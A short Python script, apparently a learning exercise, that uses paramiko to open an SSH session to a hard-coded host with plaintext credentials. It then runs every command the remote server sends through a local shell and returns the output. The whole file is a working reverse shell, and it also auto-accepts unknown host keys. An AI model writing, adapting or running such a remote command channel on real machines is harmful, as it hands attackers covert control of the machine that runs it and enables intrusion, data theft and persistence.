import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    
    # create the ssh client using paramiko library
    client = paramiko.SSHClient()
    
    # load hostkeys from known_hosts file
    client.load_host_keys('/home/userA/.ssh/known_hosts')
    
    # set the policy for updating host keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # connect to ip with username and password from arguments
    client.connect(ip, username=user, password=passwd)
    
    # using client get the transport object and
    # request new session from server
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
            
            # send the command through the session
            ssh_session.send(command)

            # print the received data in utf-8 'banner'
            print(ssh_session.recv(1024).decode('utf-8'))

            while True:
                # get command from ssh server
                command = ssh_session.recv(1024).decode('utf-8')

                try:
                    # 
                    cmd_output = subprocess.check_output(command, shell=True)
                    ssh_session.send(cmd_output)

                except Exception as e:
                    ssh_session.send(str(e))
            
            client.close()
    return
ssh_command('0.0.0.0', 'userA', 'password', 'ClientConnected')
            